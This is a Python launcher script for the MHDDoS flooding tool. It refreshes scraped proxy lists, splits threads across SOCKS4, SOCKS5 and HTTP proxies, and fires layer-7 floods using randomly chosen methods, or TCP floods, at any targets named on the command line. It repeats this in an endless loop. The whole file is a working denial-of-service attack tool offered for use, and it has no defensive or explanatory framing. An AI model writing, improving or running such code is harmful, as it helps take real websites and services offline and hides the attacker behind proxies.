import argparse
import multiprocessing
import os
import random
import shutil
import subprocess


L7_METHODS = ['GET', 'POST', 'STRESS', 'DYN', 'EVEN', 'BOT', 'DOWNLOADER']
RPC = '50'


def update_proxies():
    os.chdir('proxy-scraper-checker')

    subprocess.run(['python3', 'main.py'])
    shutil.rmtree('../MHDDoS/files/proxies', ignore_errors=True)
    shutil.move('./proxies', '../MHDDoS/files/')
    print('Proxies updated successfully')

    os.chdir('../')


def run_ddos(targets, total_threads, period):
    os.chdir('MHDDoS')

    s4_proxies = sum(1 for _ in open('files/proxies/socks4.txt'))
    s5_proxies = sum(1 for _ in open('files/proxies/socks5.txt'))
    http_proxies = sum(1 for _ in open('files/proxies/http.txt'))
    total_proxies = s4_proxies + s5_proxies + http_proxies
    threads_per_proxy = total_threads / len(targets) / total_proxies
    s4_threads = str(int(s4_proxies * threads_per_proxy))
    s5_threads = str(int(s5_proxies * threads_per_proxy))
    http_threads = str(int(http_proxies * threads_per_proxy))

    processes = []
    for target in targets:
        for socks_type, socks_file, threads in (
            ('4', 'socks4.txt', s4_threads),
            ('5', 'socks5.txt', s5_threads),
            ('1', 'http.txt', http_threads),
        ):
            if target.lower().startswith('tcp://'):
                process = subprocess.Popen(
                    ['python3', 'start.py', 'TCP', target[6:], threads, period, socks_type, socks_file]
                )
            else:
                method = random.choice(L7_METHODS)
                process = subprocess.Popen(
                    ['python3', 'start.py', method, target, socks_type, threads, socks_file, RPC, period]
                )

            processes.append(process)

    for p in processes:
        p.wait()

    os.chdir('../')


def start(threads_per_core, period, targets):
    total_threads = threads_per_core * multiprocessing.cpu_count()
    period = str(period)

    shutil.copy('proxy_config.py', 'proxy-scraper-checker/config.py')

    while True:
        update_proxies()
        run_ddos(targets, total_threads, period)

def init_argparse() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        '-t',
        dest='threads',
        type=int,
        default=200,
        help='Number of threads per CPU core (default is 200)',
    )
    parser.add_argument(
        '-p',
        dest='period',
        type=int,
        default=600,
        help='How often to update the proxies (default is 600)',
    )
    parser.add_argument(
        '-pt',
        dest='proxy_timeout',
        metavar='PROXY_TIMEOUT',
        type=float,
        default=3,
        help='How many seconds to wait for the proxy to make a connection. '
             'Higher values give more proxies, but with lower speed/quality (default is 3)',
    )
    parser.add_argument(
        'targets',
        nargs='+',
        help='List of targets, separated by spaces',
    )

    return parser


if __name__ == '__main__':
    args = init_argparse().parse_args()
    os.putenv('PROXY_TIMEOUT', str(args.proxy_timeout))
    start(args.threads, args.period, args.targets)
